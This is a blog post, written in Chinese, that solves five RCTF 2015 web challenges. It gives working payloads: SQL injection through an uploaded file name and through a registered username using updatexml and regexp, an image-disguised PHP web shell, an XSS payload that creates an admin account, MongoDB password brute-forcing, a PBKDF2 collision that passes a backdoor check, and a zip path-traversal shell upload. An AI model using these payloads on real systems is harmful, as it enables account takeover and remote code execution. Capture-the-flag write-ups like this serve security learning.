---
layout: post
title: RCTF-writeup[web]
tags: [writeup]
date: 2015-11-17 09:34:39
---

**upload**
看起来是一个上传题，其实这是一个注入题。在文件名的地方存在注入。因为注入点是insert的，如果直接进行报错注入或者延时注入的话会提示sqlinject find。我们可以利用二次注入，来得到数据。通过fuzz发现，在进行insert操作的时候有三个列，所以构造

```
文件名','uid','uid'),((database()),'uid','uid')#.jpg
```
就可以看到回显的数据，然后通过走流程就可以查询出flag，但是有一点要注意题目直接把select from 这些关键字过滤了两次所以得构造这样的selselectect才行。


**weeeeeb3**

先注册一个帐号，然后找回密码，输入正确的信息。到第二步提示修改新的密码的时候，直接抓包把用户名修改为admin。然后就可以登陆admin这个帐号，然后在manage页面提示 not allow ip 我们把xxf改为127.0.0.1就可以绕过。然后要我们猜action 由于是filemanage就直接猜action＝upload 然后就出现一个上传页面，通过一轮fuzz，直接上传一个图片马，在后面写上

```
<script lanaguage="php"> phpinfo()</script>
```
把后缀改为php5 就成功拿到了flag。


**xss**
这是一个留言板，通过fuzz发现过滤了很多标签，除此之外还把on事件直接给过滤了。后面测试发现可以使用link标签，然后使用sctf里面那种方法就可以弹框了。

```
<link rel="import" href="data:text/html;base64,PHNjcmlwdD5kZWxldGUgYWxlcnQ7YWxlcnQoIkhlbGxvIik7PC9zY3JpcHQ+">
```
![xss-1.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1170534972.jpg)

查看页面的html源码发现

```
<!--only for admin
<form action="" method="post">
username:<input type="text" name="name"><br />
password:<input type="password" name="pass"><br />
<input type="radio" name="isadmin" value="0">user
<input type="radio" name="isadmin" value="1">admin<br />
<input type="hidden" name="token" value="34a1615ff3eaf616f7fa205a12792d27">
<input type="submit" name="adduser" value="adduser">
</form>-->
```
很明显啦，就是要添加一个管理帐号帐号，发现页面使用啦jquery直接添加帐号就行。

```javascript
<script src=http://180.76.178.54:8004/4b79f5d4860384d4ac494ad91f5313b7/js/jquery.js></script>
<script>
$.ajax({
                               type: "post",
                               url: "",
                               data: "name=tomato123&pass=tomato123&isadmin=1&adduser=adduser&token="+$("input[name=token]").val()})
</script>
```

然后构造payload

```
<link rel="import" href="data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovLzE4MC43Ni4xNzguNTQ6ODAwNC80Yjc5ZjVkNDg2MDM4NGQ0YWM0OTRhZDkxZjUzMTNiNy9qcy9qcXVlcnkuanM+PC9zY3JpcHQ+CjxzY3JpcHQ+CiQuYWpheCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlOiAicG9zdCIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB1cmw6ICIiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YTogIm5hbWU9dG9tYXRvMTIzJnBhc3M9dG9tYXRvMTIzJmlzYWRtaW49MSZhZGR1c2VyPWFkZHVzZXImdG9rZW49IiskKCJpbnB1dFtuYW1lPXRva2VuXSIpLnZhbCgpfSkKPC9zY3JpcHQ+">
```
添加了一个帐号密码为tomato123的管理员
访问admin.php拿到flag
![xss－2.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-545225687.jpg)




**easysql**
注册一个aaa\然后在修改密码的页面可以发现报错

![easysql-1.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2913177276.jpg)

可以看到是双引号，这明显是一个二次注入，然后重新构造语句发现不能含有空格。但是这并不影响，直接用括号代替就行了。

![easysql-2.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-157009057.jpg)

然后爆出一个flag表，查询提示说flag not here，然后去查users里面的列名发现

![easysql－3.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3268258668.jpg)

然后直接去查询里面的内容，发现只能出现RCTF这几个字符，然后就一直在纠结怎么查询，因为测试发现把substring left，right，reverse like 这些都拦截了。后面灵机一动想到了regexp。

```
username=tomato"||updatexml(0x7c,concat((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^R'))),1)#&password=tomato&email=tomato
```
然后成功搞定

![easysql－4.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1387239513.jpg)


**login**
第二天给了提示说是nosql，那就猜是mongodb
![login-1.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3330162428.jpg)

那就开始跑密码了。![login－2.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-3255963769.jpg)

跑出的帐号密码为

```
ROIS_ADMIN  pas5woRd_i5_45e2884c4e5b9df49c747e1d
```
然后登陆一发。
![login-3.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-460039838.jpg)

下载备份文件，发现是一个php的解压zip的类，然后百度找到官方提供的，在diff一下

![login-4.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1149569489.jpg)


还在html源码里面发现

```php
$Agent = $_SERVER['HTTP_USER_AGENT'];
$backDoor = $_COOKIE['backdoor'];
$msg = json_encode("no privilege");
$iterations = 1000;
$salt = "roisctf";
$alg = "sha1";
$keylen = "20";
if ($Agent == $backDoor || strlen($Agent) != 65) {
    exit($msg);
}
if (substr($Agent,0,23) != "rois_special_user_agent") {
    exit($msg);
}
if (pbkdf2($alg, $Agent, $salt, $iterations, $keylen) != pbkdf2($alg, $backDoor, $salt, $iterations, $keylen)) {
    exit($msg);
}
```
测试发现直接上传zip提示没有权限，然后只有过了上面三个条件才行。主要是第三个条件不好过，然后google一发
pdkdf2 ctf 

![login－5.jpg][11]![2664205826](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2664205826.jpg)

找到了这个 PBKDF2+HMAC collision
然后在https://mathiasbynens.be/notes/pbkdf2-hmac
这篇文章里面说到这个是可以碰撞的，就是不同的明文会出现相同的密文，然后用里面提供的脚本跑一发。成功跑出来一个

```
rois_special_user_agentaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaamipvkd

3-Rfm^Bq;ZZAcl]mS&eE
```
然后改一下ua，在cookie里面添加backdoor就可以成功上传了。

![login－6.jpg][12]![2009859300](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2009859300.jpg)

按照解压出来的文件的命名规则为md5(文件名＋RoisFighting).文件的后缀
但是访问http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/051ee28a1964f9f2779d32f2e48212cb/70d08f9380da3a6e0440b3266a2a39f6.php![2977300730](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2977300730.jpg)

文件并不存在，测试发现在解压后会直接删除文件，所以我们可以尝试构造一个解压到上级目录的shell



![login-7.jpg](http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2977300730.jpg)

shell地址就是
http://180.76.178.54:8005/53a0fb1b692f02436c3b5dda1db9c361/upload/image/382aef24b11f8c5222bc58062a9bf5c7.php


  [1]: http://bl4ck.in/usr/uploads/2015/11/1170534972.jpg
  [2]: http://bl4ck.in/usr/uploads/2015/11/545225687.jpg
  [3]: http://bl4ck.in/usr/uploads/2015/11/2913177276.jpg
  [4]: http://bl4ck.in/usr/uploads/2015/11/157009057.jpg
  [5]: http://bl4ck.in/usr/uploads/2015/11/3268258668.jpg
  [6]: http://bl4ck.in/usr/uploads/2015/11/1387239513.jpg
  [7]: http://bl4ck.in/usr/uploads/2015/11/3330162428.jpg
  [8]: http://bl4ck.in/usr/uploads/2015/11/3255963769.jpg
  [9]: http://bl4ck.in/usr/uploads/2015/11/460039838.jpg
  [10]: http://bl4ck.in/usr/uploads/2015/11/1149569489.jpg
  [11]: http://bl4ck.in/usr/uploads/2015/11/2664205826.jpg
  [12]: http://bl4ck.in/usr/uploads/2015/11/2009859300.jpg
  [13]: http://bl4ck.in/usr/uploads/2015/11/2977300730.jpg

